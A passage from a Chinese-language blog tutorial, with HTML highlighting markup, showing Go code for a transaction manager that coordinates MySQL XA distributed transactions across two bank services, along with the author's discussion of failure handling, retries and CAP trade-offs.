&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">command&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;/bank&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;-bank-id&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;2&amp;#34;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">expose&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="m">5000&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">restart&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">always&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">depends_on&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">tm&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">mysql&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">app&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">build&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">context&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">.&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">dockerfile&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">docker/app.Dockerfile&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">expose&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="m">5000&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">restart&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">always&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">depends_on&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">tm&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">bank1&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">bank2&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">mysql&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>其中 Bank1/Bank2 用的同一套代码，以命令行参数来区分连接不同的数据库。&lt;/p>
&lt;h2 id="5-tm-实现">#5 TM 实现&lt;/h2>
&lt;h3 id="创建全局事务">创建全局事务&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">func&lt;/span> &lt;span class="nf">createGlobalTx&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">gin&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">req&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">tm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">CreateGlobalTxReq&lt;/span>&lt;span class="p">{}&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">BindJSON&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">db&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">MustGet&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;db&amp;#34;&lt;/span>&lt;span class="p">).(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nx">sqlx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">DB&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">db&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NamedExecContext&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Context&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="s">`INSERT INTO global_tx(gid) VALUES(:gid)`&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">tm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">GlobalTx&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">GID&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">GID&lt;/span>&lt;span class="p">})&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">JSONP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">200&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kd">map&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="kt">string&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="kd">interface&lt;/span>&lt;span class="p">{}{&lt;/span>
&lt;span class="s">&amp;#34;code&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s">&amp;#34;message&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;ok&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">})&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>暂时没有考虑更多全局事务的用法，只是单纯的保存。&lt;/p>
&lt;h3 id="注册本地事务">注册本地事务&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">func&lt;/span> &lt;span class="nf">registerLocalTx&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">gin&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">req&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">tm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">RegisterLocalTxReq&lt;/span>&lt;span class="p">{}&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">BindJSON&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">db&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">MustGet&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;db&amp;#34;&lt;/span>&lt;span class="p">).(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nx">sqlx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">DB&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">db&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NamedExecContext&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Context&lt;/span>&lt;span class="p">(),&lt;/span>
&lt;span class="s">`INSERT INTO local_tx(gid,branch_id,callback_url) values(:gid, :branch_id, :callback_url)`&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">tm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">LocalTx&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="nx">GID&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">GID&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">BranchID&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">BranchID&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">CallbackUrl&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">CallbackUrl&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">},&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">JSONP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">200&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kd">map&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="kt">string&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="kd">interface&lt;/span>&lt;span class="p">{}{&lt;/span>
&lt;span class="s">&amp;#34;code&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s">&amp;#34;message&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;ok&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">})&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>本地事务需要记录下对应的全局事务ID和分支ID（就是这个本地事务的ID，用于回调的时候告诉RM提交哪个本地事务，在MySQL XA里就是XID 的 bqual 部分），以及回调的地址。&lt;/p>
&lt;h3 id="提交全局事务">提交全局事务&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">func&lt;/span> &lt;span class="nf">commitGlobalTx&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">gin&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">req&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">tm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">CommitGlobalTxReq&lt;/span>&lt;span class="p">{}&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">BindJSON&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">db&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">MustGet&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;db&amp;#34;&lt;/span>&lt;span class="p">).(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nx">sqlx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">DB&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">allLocalTx&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">([]&lt;/span>&lt;span class="nx">tm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">LocalTx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">db&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">SelectContext&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Context&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">allLocalTx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;SELECT * FROM local_tx WHERE gid=?&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">GID&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// TODO 极端情况下，回调 RM 时出现部分失败要如何处理？
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">cli&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Client&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">Transport&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">otelhttp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewTransport&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">DefaultTransport&lt;/span>&lt;span class="p">)}&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">tx&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="k">range&lt;/span> &lt;span class="nx">allLocalTx&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">callbackPayload&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">bank&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">TMCallbackReq&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">Action&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;commit&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">GID&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">GID&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">BranchID&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">tx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">BranchID&lt;/span>&lt;span class="p">}&lt;/span>
&lt;span class="nx">callbackResp&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">bank&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">TMCallbackResp&lt;/span>&lt;span class="p">{}&lt;/span>
&lt;span class="nx">err&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">client&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">WrappedPost&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Context&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="nx">cli&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">tx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">CallbackUrl&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">callbackPayload&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">callbackResp&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">callbackResp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Code&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">JSONP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">500&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">tm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">CommitGlobalTxResp&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="nx">Code&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">Message&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Sprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;commit local tx failed, response code %d, %s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">callbackResp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Code&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">callbackResp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Message&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="p">})&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">JSONP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">200&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kd">map&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="kt">string&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="kd">interface&lt;/span>&lt;span class="p">{}{&lt;/span>
&lt;span class="s">&amp;#34;code&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s">&amp;#34;message&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;ok&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">})&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>全局事务的提交，本质是由TM负责逐个告知RM提交自己的本地事务，也是整个 XA 过程里最重要也最脆弱的一步。理论上来说这时的 XA 事务无论是提交还是回滚都应该无条件成功。&lt;/p>
&lt;p>但TM本身，以及TM和RM之间的网络存在故障的可能。如果TM崩溃，或者TM和RM之间出现网络分区，导致TM无法发出提交或回滚的消息时，就会导致参与者陷入长时间的阻塞，直到TM恢复运行，或网络恢复畅通，参与者收到TM发出的Commit或Rollback消息为止。&lt;/p>
&lt;p>更可能出现的情况是，一个或几个参与者出现网络分区或崩溃，没有收到 Commit 消息，只能继续阻塞等待，TM也需要不断重试。参与者不能依据超时时间武断提交或回滚，因为TM很可能发出了提交的指令，只是因为网络状况不佳等原因未能及时送达。这一情况也可以通过参与者之间互相询问来解决，等待超时的参与者可以询问其他参与者，如果有参与者未准备则可以确定需要回滚，如果有参与者已经提交，则也可以确定需要提交。但如果所有参与者都处于就绪状态，则无法判断TM的最终决策，只能继续傻等。&lt;/p>
&lt;p>另外关于网络分区（就是CAP中的P），假如说消息发送者会不断重试发送，直到接收者告知成功，暂且认为多次发送消息产生的结果是幂等的，那么接收者因为网络原因未能接收到消息，和接收到了消息，但因为接收者本身的故障或资源不足等原因未能处理消息就崩溃重启的话，实质上和网络分区的结果是差不多的，都可以看作是接收者未能收到消息。举例来说就是一个HTTP请求在程序中间件里触发了崩溃，没有执行任何业务逻辑，直到压力缓解后才恢复，这种情况放在上面的场景（TM回调提交本地事务）里分析，和出现网络分区的情况是很接近的。（PS：开脑洞，别当真啊，应该和 P 还是不大一样的）&lt;/p>
&lt;p>所以总结就是，TM要保证最终一致，所有的XA事务都被提交或回滚。一旦进入提交或回滚全局事务的状态，则&lt;strong>需要无限次尝试回调提交或回滚本地事务，直至全部成功&lt;/strong>。上面的案例代码是没有考虑重试的情况，实际应该在函数里不断重试，直到成功。或者直接放到后台去跑，返回个提交进行中也是一种办法。大部分情况下应该是不会有问题的，直接重试也还能接受。可以给个超时，如果出现部分失败就放到后台去慢慢跑，先返回个进行中。&lt;/p>
&lt;p>虽然保证了一致性（CAP里的C），也容忍了叫参与者提交本地事务失败而产生的分区（P），但这样做必然是要舍弃一部分可用性（A）的。所以 XA 事务是一种保证 CP 的分布式事务解决方案。&lt;/p>
&lt;h3 id="回滚本地事务">回滚本地事务&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">func&lt;/span> &lt;span class="nf">rollbackGlobalTx&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">gin&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">req&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">tm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">RollbackGlobalTxReq&lt;/span>&lt;span class="p">{}&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">BindJSON&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">db&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">MustGet&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;db&amp;#34;&lt;/span>&lt;span class="p">).(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nx">sqlx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">DB&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">allLocalTx&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">([]&lt;/span>&lt;span class="nx">tm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">LocalTx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">db&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">SelectContext&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Context&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">allLocalTx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;SELECT * FROM local_tx WHERE gid=?&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">GID&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// TODO 极端情况下，回调 RM 时出现部分失败要如何处理？
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">cli&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Client&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">Transport&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">otelhttp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewTransport&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">DefaultTransport&lt;/span>&lt;span class="p">)}&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">tx&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="k">range&lt;/span> &lt;span class="nx">allLocalTx&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">callbackPayload&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">bank&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">TMCallbackReq&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">Action&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;rollback&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">GID&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">GID&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">BranchID&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">tx&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">BranchID&lt;/span>&lt;span class="p">}&lt;/span>
&lt;span class="nx">callbackResp&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">bank&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">TMCallbackResp&lt;/span>&lt;span class="p">{}&lt;/span>
